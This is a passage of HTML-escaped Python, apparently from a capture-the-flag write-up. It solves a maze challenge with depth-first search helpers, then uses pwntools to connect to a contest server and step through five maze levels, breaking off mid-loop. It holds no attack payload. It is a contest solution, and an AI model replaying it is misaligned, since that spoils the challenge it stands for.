        &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt;
 
        &lt;span class=&#34;c1&#34;&gt;# 走过的路不再走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 遇到墙不走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;maze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;
 
 
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;down&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# 遇到迷宫最下方的时候，不能继续往下走&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 走过的路不再走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 遇到墙不走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;maze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;
 
 
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# 遇到迷宫最左边，不能继续往左走&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 走过的路不再走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 遇到墙不走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;maze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;
 
 
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# 遇到迷宫最右边，不能继续向右移动&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 走过的路不再走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 遇到墙不走&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;maze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;tmp1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;tmp2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;
	

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;182.92.203.154&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Please press any key to start.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LEVEL&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;maze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Get_T&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;history_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
